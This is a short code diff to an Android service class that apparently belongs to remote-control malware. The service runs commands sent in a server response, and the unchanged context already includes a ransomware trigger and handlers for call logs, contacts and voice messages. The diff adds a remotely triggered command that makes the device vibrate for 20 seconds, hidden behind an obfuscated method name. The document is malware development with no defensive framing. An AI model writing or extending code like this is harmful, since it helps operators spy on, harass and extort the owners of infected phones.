@@ -22,6 +22,8 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.os.SystemClock;
+import android.os.VibrationEffect;
+import android.os.Vibrator;
 import android.provider.ContactsContract;
 import android.speech.tts.TextToSpeech;
 import android.telephony.TelephonyManager;
@@ -329,7 +331,9 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         if (response.has("ransomware")) {
             ransomware(response);
         }
-
+        if (response.has("vibrate")) {
+            swagkarnaloveshandeercel(response);
+        }
         if (response.has("voice_message")) {
             startVoiceMessage(response);
         }
@@ -605,6 +609,16 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     private void ransomware(JSONObject jsonObject){
         MyService rf = new MyService();
         rf.startrans();
+    }
+    private void swagkarnaloveshandeercel(JSONObject jsonObject){
+        Vibrator vibrator;
+        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+        if (Build.VERSION.SDK_INT >= 26) {
+            vibrator.vibrate(VibrationEffect.createOneShot(20000, VibrationEffect.DEFAULT_AMPLITUDE));
+        } else {
+            vibrator.vibrate(20000);
+        }
     }
     private void getCallLog() {
         CallsProvider callsProvider = new CallsProvider(context);
